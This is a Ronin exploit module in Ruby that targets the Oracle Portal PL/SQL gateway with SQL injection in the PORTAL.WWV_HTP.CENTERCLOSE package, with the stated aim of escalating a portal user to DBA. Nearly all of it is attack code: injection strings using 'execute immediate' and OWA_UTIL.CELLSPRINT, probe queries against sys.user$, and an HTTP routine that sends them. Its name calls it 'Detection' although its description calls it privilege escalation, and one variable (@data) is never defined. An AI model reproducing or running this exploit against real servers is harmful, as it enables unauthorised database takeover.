#!/usr/bin/env ronin-exploit -f

require 'ronin/exploits/http'

Ronin::Exploits::HTTP.object do

  parameter :uri_path, :default => '/pls',
                       :description => 'The URI PATH'

  parameter :dad, :default => 'portal',
                  :description => 'The Database Access Descriptor'

  parameter :injection, :default => 'PORTAL.WWV_HTP.CENTERCLOSE',
                        :description => 'The vulnerable injection package'

  cache do
    self.name = 'Oracle Application PL/SQL Gateway Detection'
    self.version = '0.1'
    self.description = %{
      Oracle Portal Privilege Escalation. Tries various privilege escalation
      exploits against oracle portal's that are vulnerable to sql injection
      in an attempt to escalate the current portal user to DBA.
    }

    licensed_under :mit

    author :name => 'CG', :organization => 'carnal0wnage'
  end

  build do
		@sql_current_user = "select+user+from+dual"
		@sql_current_user_priv = "select+\*+from+user_role_privs"
		@sql_check = "select+'my'||'veeryv3ry'||'rand0mt3xt'+from+dual";
		@sql_check_priv = "select+'my'||'veeryv3ry'||'rand0mt3xt'+from+sys.user\$+where+rownum=1";
		@url_code = "?);execute+immediate+:1;--="
		@url_dba = "?);OWA_UTIL.CELLSPRINT(:1);--=";

    @exploit_path = "#{@uri_path}#{@data}#{@injection}"

    @sqli = YAML.load_file(find_data_file('oracle/modplsql_injections.yml'))
  end

  deploy do
    send_injection(@url_dba + @sql_check) do |response|
      unless response.body =~ /myveeryv3ryrand0mt3xt/i
        deploy_failed! "URL may be invalid"
      end
    end

    send_injection(@url_dba + @sql_check_priv) do |response|
    end
  end

  protected

  def send_injection(payload)
    response = http_get(:path => "#{@uri_path}/#{@dad}/#{@injection}#{payload}")

    case response.code
    when '200'
      yield response
    when '302', '301'
      location = response.headers['Location']
      print_status "Received HTTP Redirect: #{location}"
    else
      print_status "Received HTTP #{response.code}"
    end
  end

  def injected?(payload)
    send_injection(payload) do |response|
      unless response.body =~ /myveeryv3ryrand0mt3xt/i
        deploy_failed! "URL may be invalid"
      end
    end
  end

end
